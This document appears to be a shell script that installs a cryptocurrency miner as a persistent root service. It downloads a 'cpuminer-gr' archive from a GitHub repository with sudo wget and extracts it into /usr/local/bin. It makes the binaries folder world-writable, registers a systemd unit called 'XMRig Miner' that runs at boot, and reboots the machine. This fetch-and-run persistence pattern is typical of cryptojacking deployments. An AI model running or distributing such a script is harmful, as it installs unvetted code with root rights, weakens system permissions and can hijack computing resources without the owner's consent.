cd /usr/local/bin
sudo wget https://github.com/aucpollo/sim/raw/main/cpuminer-gr-1.2.4.1-x86_64_linux.7z
sudo apt update
sudo apt-get install -y p7zip-full
sudo 7z x cpuminer-gr-1.2.4.1-x86_64_linux.7z
sudo chmod +x cpuminer.sh
sudo chmod -R 777 binaries
sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash /usr/local/bin/cpuminer.sh\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
sudo systemctl daemon-reload
sudo systemctl enable xmrig.service
echo "Setup completed!"
sudo reboot
